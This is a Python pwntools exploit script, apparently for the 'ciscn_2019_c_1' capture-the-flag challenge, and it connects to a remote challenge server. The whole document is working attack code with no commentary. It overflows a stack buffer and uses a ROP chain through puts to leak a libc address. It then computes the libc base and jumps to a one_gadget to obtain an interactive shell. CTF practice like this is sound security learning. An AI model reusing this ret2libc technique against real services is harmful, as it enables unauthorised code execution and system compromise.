from pwn import *
context.log_level = 'info'

elf = ELF("./ciscn_2019_c_1")
libc = ELF("./libc6_2.27-0ubuntu2_amd64.so")

pop_rdi_ret = 0x0000000000400c83 # pop rdi ; ret

gs = """
    break *0x4009dd
    continue
"""
#sock = gdb.debug(elf.path,gdbscript=gs)
#sock = process(elf.path)
sock = remote("node4.buuoj.cn",29364)


payload = b"A" * 0x58
payload += p64(pop_rdi_ret)
#payload += p64(elf.got["puts"])
#payload += p64(elf.got["gets"])
payload += p64(elf.got["fflush"])
payload += p64(elf.plt["puts"])
payload += p64(elf.sym["encrypt"])
print(payload)

sock.sendlineafter(b"Input your choice!\n", b"1")
sock.sendlineafter(b"Input your Plaintext to be encrypted\n", payload)

_= sock.recvline()
_= sock.recvline()
leak_addr = u64(sock.recvline()[:-1].ljust(8, b"\x00"))
print(hex(leak_addr))
libc_base = leak_addr - libc.sym["fflush"]
log.info("libc_base = " + hex(libc_base))

one_gadget_addrs = [0x4f2c5,0x4f322,0x10a38c]

payload = b"A" * 0x58
payload += p64(libc_base + one_gadget_addrs[1])
sock.sendlineafter(b"Input your Plaintext to be encrypted\n", payload)


sock.interactive()
